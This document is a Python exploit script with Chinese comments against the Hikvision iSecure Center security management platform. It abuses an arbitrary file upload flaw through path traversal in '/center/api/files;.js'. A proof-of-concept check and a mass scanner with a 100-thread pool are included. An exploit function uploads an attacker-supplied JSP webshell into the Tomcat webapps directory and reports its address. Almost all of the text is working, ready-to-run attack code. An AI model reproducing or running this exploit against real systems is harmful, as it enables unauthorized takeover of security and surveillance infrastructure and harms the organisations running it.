# 海康威视isecure center 综合安防管理平台存在任意文件上传漏洞
import argparse,requests,sys,time,os  #调用模块
from multiprocessing.dummy import Pool      #调用模块
requests.packages.urllib3.disable_warnings()       #证书错误抑制

# 定义指纹
def banner():   
    banner ='''

#                 #    #   ___                       
#=ooO=========Ooo=#    #  <_*_>            ,,,,,     
#  \\  (o o)  //  #    #  (o o)           /(o o)\    
--------(_)------------8---(_)--Ooo----ooO--(_)--Ooo-
                            @author:qbt
                            @version:0.0.1
'''
    print(banner)
# 定义poc
def poc(target):
    url = target+'/center/api/files;.js'
    url1 = target + '/clusterMgr/c.txt;.js'
    headers = {
        'User-Agent': 'python-requests/2.31.0'
    }
    file = {
        'file':('../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/c.txt', 'ccc', 'application/octet-stream')
    }
    try:
# 发送一个post请求，用于上传文件，文件名:c.txt,文件内容：ccc
        res = requests.post(url=url,headers=headers,files=file,verify=False,timeout=15)
# 发送一个get请求，去确认是否上传成功
        res1 = requests.get(url=url1,timeout=5,verify=False)
        # print(res1.text)
# 判断响应内容并打印出来
        if 'ccc' in res1.text :
            print("[+]"+ target + "海康威视isecure center 综合安防管理平台存在任意文件上传漏洞")
            with open('seccess.txt','a',encoding='utf-8') as f:
                f.write('[+]'+target+'海康威视isecure center 综合安防管理平台存在任意文件上传漏洞\n')
                return True
        else:
                print("[-]"+ target + "不存在漏洞")
                return False
    except:
        print('抛出一个错误')
# 定义exp
def exp(target):
    print('正在上传webshell,请注意shell.txt的内容即你的木马,请提前写好')
    time.sleep(3) #延时3秒
    os.system('cls')    #清屏
    url = target + '/center/api/files;.js'
    url1 = target + '/clusterMgr/shell.jsp;.js'
    headers = {
        'User-Agent': 'python-requests/2.31.0'
    }
# 打开你的shell.txt的文本
    with open('shell.txt','r') as f:
        flag = f.read()
    file = {
        'file':('../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/shell.jsp', flag, 'application/octet-stream')
    }
#尝试上传木马文件并访问
    try:
            res = requests.post(url=url,headers=headers,files=file,verify=False,timeout=15)
            res1 = requests.get(url=url1,timeout=5,verify=False)
            if res1.status_code == 200 :
                print('上传成功，漏洞地址为：'+url1)
            else:
                print('上传失败，建议更换木马')
    except:
        print('出现未知错误')
# 定义主函数
def main():
    banner() #调用指纹函数
#实例化
    parser = argparse.ArgumentParser(description='海康威视isecure center 综合安防管理平台存在任意文件上传漏洞')
#定义参数
    parser.add_argument('-u','-url',dest='url',help='请输入url',type=str)
    parser.add_argument('-f','--file',dest='file',help='url.txt',type=str)
#处理命令行参数
    args = parser.parse_args()
#判断是单个url还是文件
    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)
    elif not args.url and args.file:
#定义一个空列表
        url_list = []
#打开文件并单行读取并输入到定义的列表中
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip().replace("\n",""))
#线程池为100
        mp = Pool(100)
#将列表的参数，输入到poc
        mp.map(poc, url_list)
#关闭多线程
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


#调用主函数，有防止被误操作导致直接执行的作用
if __name__ == '__main__':
    main()